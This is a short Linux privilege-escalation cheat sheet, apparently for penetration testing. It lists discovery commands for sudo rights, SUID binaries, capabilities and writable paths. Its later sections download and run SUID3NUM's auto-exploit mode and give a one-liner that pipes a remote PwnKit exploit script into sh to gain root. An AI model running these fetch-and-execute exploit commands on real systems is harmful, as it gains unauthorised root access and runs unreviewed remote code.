# Linux Privilege Escalation

Run discovery commands before attempting escalation.

## Sudo permissions

```bash
sudo -l
```

## SUID files on the current filesystem

```bash
find / -xdev -type f -perm -4000 2>/dev/null
```

## File capabilities

```bash
getcap -r / 2>/dev/null
```

## Scheduled tasks for the current user

```bash
crontab -l
```

## Systemd timers

```bash
systemctl list-timers --all
```

## Writable directories

```bash
find / -xdev -type d -writable 2>/dev/null
```

## Writable files

```bash
find / -xdev -type f -writable 2>/dev/null
```

## Mounted filesystems

```bash
findmnt
```

## Running processes

```bash
ps auxww
```

## SUID follow-up

Check identified binaries against [GTFOBins](https://gtfobins.org/).

## SUID3NUM

Review third-party scripts before execution. Choose one downloader.

```bash
wget -O suid3num.py https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py && chmod +x suid3num.py
```

```bash
curl -fL https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid3num.py && chmod +x suid3num.py
```

auto exploit
```bash
python suid3num.py -e
```

[SUID3NUM repository](https://github.com/Anon-Exploiter/SUID3NUM)

## Pkexec
One liner
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```